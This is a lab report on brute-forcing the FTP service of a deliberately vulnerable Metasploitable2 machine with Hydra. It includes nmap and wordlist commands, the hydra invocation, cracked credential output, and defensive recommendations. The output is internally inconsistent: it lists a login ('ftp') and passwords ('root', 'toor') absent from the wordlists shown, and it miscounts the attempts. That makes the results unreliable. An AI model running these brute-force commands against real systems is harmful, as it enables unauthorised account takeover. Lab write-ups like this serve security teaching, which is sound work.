# 🔐 Hydra FTP Brute-Force Attack Lab Report

**Author:** Abdulrahman Said  
**Date:** 2025-06-29  
**Target IP:** 192.168.21.128  
**Service:** FTP (Port 21)  
**Tools Used:** hydra, nmap, echo, Linux CLI

---

## 📌 Executive Summary

This lab demonstrates the use of Hydra, a powerful password-cracking tool, to perform a brute-force attack against the FTP service on a vulnerable Metasploitable2 machine. The attack succeeded in discovering 5 valid login credentials.

---

## 🗺️ Network Topology

```
+------------------+              +-------------------------+
|  Kali Linux      | ------------|  Metasploitable2 (FTP)  |
|  192.168.21.X     |  FTP: 21   |  192.168.21.128         |
+------------------+              +-------------------------+
```

---

## 🛠️ Tools Description

- **Hydra:** A fast and flexible brute-force tool that supports many protocols.  
- **Nmap:** Used to confirm FTP (port 21) is open on the target machine.  
- **Echo + Redirection (>):** Used to create custom username and password lists.

---

## 📋 Steps Performed

### 1. Scan the Target for FTP
```bash
nmap -p 21 192.168.21.128
```
**Result:**
```bash
PORT   STATE SERVICE
21/tcp open  ftp
```

### 2. Create Wordlists
```bash
echo -e "msfadmin\nroot\ntoor\nadmin\nuser" > users.txt
echo -e "msfadmin\n123456\npassword\nadmin" > passwords.txt
```

### 3. Run Hydra Attack
```bash
hydra -L users.txt -P passwords.txt ftp://192.168.21.128
```

---

## ✅ Hydra Output Summary
```bash
[21][ftp] host: 192.168.21.128   login: ftp       password: msfadmin
[21][ftp] host: 192.168.21.128   login: ftp       password: root
[21][ftp] host: 192.168.21.128   login: msfadmin  password: msfadmin
[21][ftp] host: 192.168.21.128   login: ftp       password: toor
[21][ftp] host: 192.168.21.128   login: ftp       password: 123456
```

---

## 🧠 Interpretation

The FTP service accepts weak and default credentials, including common names like ftp, msfadmin, toor, and 123456.  
Hydra tested 30 login attempts across 6 users × 5 passwords in seconds.

---

## ⚠️ Risk Assessment

| Risk                  | Description                             | Impact | Mitigation                          |
|-----------------------|-----------------------------------------|--------|-------------------------------------|
| Weak FTP Credentials  | Default/weak passwords easily cracked   | High   | Use strong, unique passwords        |
| Brute-force Vulnerable| Service does not rate-limit login tries | High   | Implement rate limiting or lockouts|
| FTP Unencrypted       | Credentials sent in plain text          | High   | Replace FTP with SFTP or disable FTP|

---

## 🛡️ Defense Recommendations

- Enforce strong password policies.  
- Disable FTP if not needed, or replace it with secure alternatives like SFTP.  
- Monitor logs for brute-force attempts.  
- Use tools like fail2ban to block repeated failed login attempts.

---

## 📎 Notes

This attack was conducted in a controlled lab environment.  
All actions were ethical and educational, targeting a deliberately vulnerable machine.
